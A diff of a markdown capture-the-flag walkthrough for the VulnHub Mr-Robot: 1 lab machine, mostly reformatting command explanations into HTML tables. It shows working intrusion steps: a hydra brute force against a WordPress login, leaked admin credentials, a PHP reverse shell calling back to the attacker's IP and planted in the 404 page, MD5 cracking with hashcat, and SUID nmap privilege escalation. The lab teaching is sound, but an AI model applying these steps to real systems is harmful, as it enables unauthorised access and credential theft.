@@ -9,13 +9,11 @@ excerpt: "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Cras nulla ni
 ---
 
 [Mr. Robot](https://www.imdb.com/title/tt4158110/) is one of the greatest TV shows ever made, and it is the most authentic representation of actual real life hacking to this day.
-
 [Mr-Robot: 1](https://www.vulnhub.com/entry/mr-robot-1,151/) has 3 flags to find.
 
 # Preparation
 
-The virtual machines are placed onto the same isolated internal network where they can only communicate with each other.
-
+The virtual machines are placed onto the same isolated internal network where they can only communicate with each other.<br>
 On the isolated internal network, the VirtualBox DHCP server assigns IP addresses to the machines:
 
 ```sh
@@ -58,10 +56,8 @@ MAC Address: 08:00:27:FE:07:51 (Oracle VirtualBox virtual NIC)
 Nmap done: 11 IP addresses (2 hosts up) scanned in 32.14 seconds
 ```
 
-**Nmap** found the vulnerable machine and reported it with the IP address `10.38.1.111`.
-
-Port [80](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?search=80) and [443](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?search=443) are well-known ports used to establish connection with **web servers**.
-
+**Nmap** found the vulnerable machine and reported it with the IP address `10.38.1.111`.<br>
+Port [80](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?search=80) and [443](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?search=443) are well-known ports used to establish connection with **web servers**.<br>
 Looking up `10.38.1.111` in a web browser, we're presented with the clone of the promotion website of the [Mr. Robot TV series](https://www.imdb.com/title/tt4158110/).
 
 ![fsociety](https://www.dropbox.com/s/mh5v8lc88k9r8tx/fsociety.png?dl=1)
@@ -178,28 +174,59 @@ In the intercepted POST request - that has been sent to the server - we're inter
 
 ### Hydra
 
-Based on the captured POST request, we can use **hydra** to guess the username:
+Based on the captured http POST request, we can use **hydra** to guess the username:
 
 ```sh
 kali@kali$ hydra -V -L fsocity.dic -p 123 10.38.1.111 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
 ```
 
-- `-V` — Verbose
-- `-L fsocity.dic` — Define dictionary
-- `-p 123` — Random unique password
-- `10.38.1.111` — IP of the vulnerable machine
-- `http-post-form` — An http POST form is being brute forced
-- `/wp-login.php` — Path where the login form is located
-- `log=^USER^&pwd=^PASS&wp-submit=Log+In` — POST parameters to send, including placeholders
-- `F=Invalid Username` — Consider an attempt as failure if the response contains the text "Invalid Username".
+<details>
+<summary>Explain this command</summary>
+
+<table>
+  <tr>
+    <td>-V</td>
+    <td>Verbose</td>
+  </tr>
+  <tr>
+    <td>-L fsocity.dic</td>
+    <td>Define dictionary</td>
+  </tr>
+  <tr>
+    <td>-p 123</td>
+    <td>Random unique password</td>
+  </tr>
+  <tr>
+    <td>10.38.1.111</td>
+    <td>IP of the vulnerable machine</td>
+  </tr>
+  <tr>
+    <td>http-post-form</td>
+    <td>An http POST form is being brute forced</td>
+  </tr>
+  <tr>
+    <td>/wp-login.php</td>
+    <td>Path where the login form is located</td>
+  </tr>
+  <tr>
+    <td>log=^USER^&pwd=^PASS&wp-submit=Log+In</td>
+    <td>POST parameters to send, including placeholders</td>
+  </tr>
+  <tr>
+    <td>F=Invalid Username</td>
+    <td>Consider an attempt as failure if the response contains the text "Invalid Username".</td>
+  </tr>
+</table>
+
+</details>
+
+**hydra** has found 3 possible usernames: `elliot`, `Elliot` and `ELLIOT`.
 
 ```sh
 [80][http-post-form] host: 10.38.1.111 login: elliot password: 123
 [80][http-post-form] host: 10.38.1.111 login: Elliot password: 123
 [80][http-post-form] host: 10.38.1.111 login: ELLIOT password: 123
 ```
-
-**hydra** has found 3 possible usernames: `elliot`, `Elliot` and `ELLIOT`.
 
 ### WPScan
 
@@ -219,25 +246,22 @@ Progress Time: 00:00:19 <=======================================================
  | Username: Elliot, Password: ER28-0652
 ```
 
-**WPScan** has found several outdated plugins and one valid username - password pair.
-
+**WPScan** has found several outdated plugins and one valid username - password pair.<br>
 Testing the credentials, we can log in to the WordPress administration interface indeed.
 
 ### Reverse shell
 
 > A **reverse shell** is a shell session established on a connection that is initiated from the victim's remote machine, not from the attacker’s host.
-> Attackers who successfully exploit a remote command execution vulnerability can use a reverse shell to obtain an interactive shell session (gain access) on the target machine.
+> Attackers who successfully exploit a remote command execution vulnerability can use a reverse shell to obtain an interactive shell session (for gaining access) on the target machine.
 
-I've downloaded a basic PHP reverse shell code from [pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell).
-
+I've downloaded a basic PHP reverse shell code from [pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell).<br>
 Prior to uploading the PHP code, the attacking machine's IP address must be assigned to the `$ip` variable.
 
 ```php
 $ip = '10.38.1.110';  // CHANGE THIS
 ```
 
-As we can log in to the WordPress site with the acquired credentials, the PHP reverse shell code can be included in a PHP file that already exists.
-
+As we can log in to the WordPress site with the acquired credentials, the PHP reverse shell code can be included in a PHP file that already exists.<br>
 I have replaced PHP code in the site's 404 page - loading the 404 page, will now will execute the PHP reverse shell code.
 
 > [404](https://en.wikipedia.org/wiki/HTTP_404) is an HTTPS standard response code, to indicate that the browser was able to communicate with a given server, but the server could not find what was requested.
@@ -293,8 +317,7 @@ drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
 
 ```
 
-Taking a glance at the file permissions, it is clearly visible that `key-2-of-3.txt` is only available to read for the user named `robot`.
-
+Taking a glance at the file permissions, it is clearly visible that `key-2-of-3.txt` is only available to read for the user named `robot`.<br>
 To prove this, we can try to output the content of the file.
 
 ```sh
@@ -302,8 +325,7 @@ $ cat key-2-of-3.txt
 cat: key-2-of-3.txt: Permission denied
 ```
 
-To get our hands on the second key, we need to perform a privilege escalation and become the root user.
-
+To get our hands on the second key, we need to perform a privilege escalation and become the root user.<br>
 Interestingly, the content of `passowrd.raw-md5` can be read, and it looks like an unsalted MD5 hashed password.
 
 ```sh
@@ -315,19 +337,40 @@ To crack this hash, we can either use [hashcat](https://hashcat.net/hashcat/)  o
 
 ### hashcat
 
-I have decided to go with **hashcat** as it is the default tool built into Kali Linux.
+I have decided to go with **hashcat** - it is the default tool built into Kali Linux.
 
 ```sh
 kali@kali$ hashcat -a 0 -m 0 password.md5 /usr/share/wordlists/rockyou.txt.gz -o result.txt
 ```
 
-- `-a 0` — Attack mode: 0 - Straight
-- `-m 0` — Hash type: 0 - MD5
-- `password.md5` — Password file where the hash is placed
-- `/usr/share/wordlists/rockyou.txt.gz` — RockYou password list
-- `-o result.txt` — Defining output file
+<details>
+<summary>Explain this command</summary>
 
-After just a couple of seconds, **hascat** has cracked our password and placed it into `result.txt`.
+<table align ="center">
+  <tr>
+    <td>-a 0</td>
+    <td>Attack mode: 0 - Straight</td>
+  </tr>
+  <tr>
+    <td>-m 0</td>
+    <td>Hash type: 0 - MD5</td>
+  </tr>
+  <tr>
+    <td>password.md5</td>
+    <td>Password file where the hash is placed</td>
+  </tr>
+  <tr>
+    <td>/usr/share/wordlists/rockyou.txt.gz</td>
+    <td>RockYou password list</td>
+  </tr>
+  <tr>
+    <td>-o result.txt</td>
+    <td>Define output file</td>
+  </tr>
+</table>
+
+</details>
+
 
 ```sh
 cat result.txt
@@ -384,10 +427,9 @@ robot@linux:~$ find / -perm -4000 2>/dev/null
 ```
 
 <details>
-<summary>Dropdown summary</summary>
-<br>
+<summary>Explain this command</summary>
 
-<table>
+<table align ="center">
   <tr>
     <td>find</td>
     <td>Search for files in a directory hierarchy</td>
@@ -402,14 +444,13 @@ robot@linux:~$ find / -perm -4000 2>/dev/null
   </tr>
   <tr>
     <td>2>/dev/null</td>
-    <td>Redirect STDERR to null device (throw it away)</td>
+    <td>Redirect STDERR to null device: throw away error messages</td>
   </tr>
 </table>
 
 </details>
 
-From the search result we can point out **nmap** - it's SUID bit is set, meaning that it can theoretically execute commands as root.
-
+From the search result we can point out **nmap** - it's SUID bit is set, meaning that it can theoretically execute commands as root.<br>
 The `nmap --help` command tells us that **nmap** has a `--interactive` option.
 
 ```sh
